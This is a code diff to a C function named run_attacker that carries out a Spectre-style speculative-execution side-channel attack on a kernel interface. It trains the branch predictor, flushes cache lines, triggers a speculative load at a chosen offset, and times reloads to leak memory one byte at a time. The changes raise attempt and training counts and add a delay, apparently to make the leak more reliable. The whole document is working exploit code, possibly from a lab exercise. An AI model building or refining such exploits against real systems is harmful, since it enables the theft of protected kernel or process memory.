@@ -50,31 +50,34 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         char leaked_byte = '?';
         const uint64_t CACHE_HIT_THRESHOLD = 80;
         int counts[256] = {0};
-        const int max_attempts = 100;
+        const int max_attempts = 300; // Increased to improve reliability
 
-        // Step 0: TLB prefetch — trigger page table walks
+        // Step 0: Trigger TLB page walks
         for (int i = 0; i < 256; i++) {
             volatile char tmp = shared_memory[i * 4096];
         }
 
         for (int attempt = 0; attempt < max_attempts; attempt++) {
-            // Step 1: Branch predictor training
-            for (int train = 0; train < 30; train++) {
-                call_kernel_part3(kernel_fd, shared_memory, 0);  // in-bounds
+            // Step 1: Train branch predictor
+            for (int train = 0; train < 100; train++) {
+                call_kernel_part3(kernel_fd, shared_memory, 0);
             }
 
-            // Step 2: Flush part of input used in victim condition
+            // Step 2: Flush hot-path input to delay resolution
             clflush(&shared_memory[0]);
 
-            // Step 3: Flush shared memory pages (side channel array)
+            // Step 3: Add delay to allow speculation to proceed
+            for (volatile int delay = 0; delay < 1000; delay++) {}
+
+            // Step 4: Flush shared memory side-channel pages
             for (int i = 0; i < 256; i++) {
                 clflush(&shared_memory[i * 4096]);
             }
 
-            // Step 4: Trigger speculative memory access
+            // Step 5: Trigger speculative load
             call_kernel_part3(kernel_fd, shared_memory, current_offset);
 
-            // Step 5: Time reload accesses
+            // Step 6: Reload timing to detect leaked value
             for (int i = 0; i < 256; i++) {
                 uint64_t access_time = time_access(&shared_memory[i * 4096]);
                 if (access_time < CACHE_HIT_THRESHOLD) {
@@ -83,7 +86,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
             }
         }
 
-        // Step 6: Majority vote
+        // Step 7: Majority vote on result
         int best_guess = -1, best_score = 0;
         for (int i = 0; i < 256; i++) {
             if (counts[i] > best_score) {
